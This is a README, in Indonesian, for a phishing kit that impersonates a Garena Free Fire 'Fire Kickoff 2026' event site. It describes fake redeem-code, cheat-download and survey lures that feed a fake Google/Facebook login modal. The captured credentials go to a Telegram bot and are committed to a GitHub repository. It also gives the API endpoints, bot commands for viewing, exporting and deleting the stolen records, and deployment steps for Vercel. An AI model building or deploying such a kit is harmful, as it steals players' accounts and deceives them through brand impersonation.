# 🎮 Free Fire — Fire Kickoff Event 2026

Proyek web berbasis **Node.js + Express** yang menyamar sebagai halaman event resmi Garena Free Fire. Dirancang untuk mengumpulkan kredensial akun pengguna melalui tiga alur utama, dengan notifikasi real-time via Telegram Bot dan penyimpanan data permanen ke GitHub.

---

## 📁 Struktur Proyek

```
ff-kickoff-event/
├── index.html          # Halaman utama — landing event (tampilan ff.garena.com)
├── coderedem.html      # Alur Code Redeem — klaim hadiah & input kode
├── aimlock.html        # Alur Tool FF — download aim lock & auto headshot
├── survey.html         # Kuesioner survei tambahan
├── server.js           # Server Express — API login, webhook Telegram, GitHub DB
├── assets/
│   └── img/            # Seluruh aset gambar lokal (hero, event, icon, badge)
│       ├── ff_icon.png          # Ikon FF 48×48 (favicon & nav logo)
│       ├── ff_logo.png          # Logo teks FF 616×90 (footer)
│       ├── hero_kickoff.jpg     # Banner hero Fire Kickoff 1920×1080
│       ├── event_gintama.jpg    # Banner Gintama × FF (dari Garena CDN)
│       ├── chars_bg.jpg         # Background section karakter
│       ├── esports_bg.jpg       # Background section esports
│       ├── google_play.png      # Tombol Google Play
│       └── ...                  # Event banners, news thumbs, dll
├── vercel.json         # Konfigurasi deploy Vercel
├── package.json        # Dependensi: express
├── README.md           # Dokumentasi proyek ini
└── materi_info.md      # Penjelasan teknis mendalam
```

---

## ⚙️ Teknologi

| Komponen       | Detail                                  |
|----------------|-----------------------------------------|
| Runtime        | Node.js 20.x                            |
| Framework      | Express 4.x                             |
| Database       | GitHub Contents API (persistent)        |
| Notifikasi     | Telegram Bot API                        |
| Deploy         | Vercel / Replit                         |
| Enkripsi data  | Base64 via GitHub API                   |
| Font           | Barlow Condensed + Barlow (Google Fonts)|

---

## 🔐 Environment Variables

Atur di Replit Secrets atau `.env`:

| Key                   | Keterangan                                        |
|-----------------------|---------------------------------------------------|
| `GITHUB`              | Personal Access Token GitHub (scope: `repo`)      |
| `TELEGRAM_BOT_TOKEN`  | Token bot Telegram dari @BotFather                |
| `TELEGRAM_CHAT_ID`    | Chat ID admin (dari @userinfobot)                 |
| `PORT`                | Port server (default: `3000`)                     |

> Token dan Chat ID juga bisa diatur lewat endpoint `/api/settings` tanpa restart server.

---

## 🚀 Menjalankan Proyek

```bash
# Install dependensi
npm install

# Jalankan server
node server.js
# → Server berjalan di http://localhost:3000
# → Di Replit: otomatis tersedia di port yang dikonfigurasi workflow
```

---

## 🌐 Halaman & Alur

### 1. `index.html` — Landing Menu
- Navbar sticky: logo FF (CDN) + menu (Home, News, Characters, Esports, Download)
- Hero banner fullscreen Fire Kickoff dengan countdown timer
- Section: Event Cards, Karakter, Esports, News, Download CTA
- Mobile: hamburger menu dengan link Garena Shop
- Globe button → membuka `ff.garena.com/en/`

### 2. `coderedem.html` — Code Redeem
- Meta: `<title>Rewards Redemption | Free Fire — Garena</title>` + OG tags lengkap
- Header: logo FF + ikon cart (Garena Shop) + tombol Home
- Form: input kode 12 karakter + pilih server/region + tombol Konfirmasi
- Dropdown "Lihat Kode Redeem Aktif" → trigger modal login
- Kode aktif Juni 2026: `FFRSX4CYHLLQ`, `FFSKTXVQF2NR`, `FFCBRAXQTS9S`, `FFSGT7KNFQ2X`, `B1RK7C5ZL8YT`
- Kode expired: `X99TK56XDJ4X`, `FFAC2YXE6RF2` (badge "SUDAH DIGUNAKAN")
- Modal login: Google / Facebook → POST `/api/login`

### 3. `aimlock.html` — Tool FF
- Navbar: logo FF (CDN) + cart Garena Shop + Home
- Hero: badge OB53 Compatible + hero background FPS
- Download card: versi 6.1.3 · Build 2026060501 · OB53 · 47 MB
- Feature cards, steps, FAQ, changelog
- Tombol Download → modal login Google / Facebook → POST `/api/login`

### 4. `survey.html` — Kuesioner
- 5 pertanyaan multi-choice tentang Free Fire
- Animasi progress bar
- Halaman hasil dengan "reward" tampilan palsu

---

## 📡 API Endpoints

| Method | Endpoint              | Fungsi                                          |
|--------|-----------------------|-------------------------------------------------|
| POST   | `/api/login`          | Menerima data login dari halaman web            |
| POST   | `/api/webhook`        | Webhook Telegram untuk admin panel bot          |
| GET    | `/api/settings`       | Ambil konfigurasi Telegram saat ini             |
| POST   | `/api/settings`       | Simpan token & chat ID Telegram                 |
| GET    | `/api/test-tg`        | Tes koneksi Telegram Bot                        |
| GET    | `/api/db-info`        | Info database GitHub (total data, ukuran)       |
| GET    | `/api/data`           | Ambil semua data login (JSON)                   |

---

## 🤖 Perintah Telegram Bot

| Perintah         | Fungsi                                     |
|------------------|--------------------------------------------|
| `/start`         | Tampilkan menu utama dengan statistik      |
| `/data`          | Lihat data login terbaru (paginasi 5/hal)  |
| `/stats`         | Statistik lengkap + breakdown per halaman  |
| `/export`        | Export 50 data terbaru dalam teks          |
| `/database`      | Info database GitHub                       |
| `/clear`         | Konfirmasi hapus semua data                |
| `/hapus 5`       | Hapus data nomor 5                         |
| `/hapus 1-50`    | Hapus data nomor 1 sampai 50               |
| `/cari`          | Cari data berdasarkan email/UID            |
| `/info`          | Informasi bot & daftar perintah            |

---

## 🗄️ Database (GitHub)

Data login disimpan di:
```
Repo  : Kztutorial99/FreeFireEvent
File  : data/logins.json
Branch: main
```

- Maksimal **5.000 record** (otomatis trim data terlama)
- Cache in-memory **15 detik** untuk kurangi GitHub API calls
- Tiap login baru memicu commit otomatis ke repo

---

## 📦 Deploy ke Vercel

```bash
vercel --prod
```

`vercel.json` sudah dikonfigurasi untuk meneruskan semua request ke `server.js`.

---

## ⚠️ Catatan

- Pastikan token GitHub memiliki scope `repo` (read + write)
- Webhook Telegram harus didaftarkan manual setelah deploy:
  ```
  https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://<domain>/api/webhook
  ```
- File `data/settings.json` menyimpan konfigurasi lokal dan tidak boleh di-commit
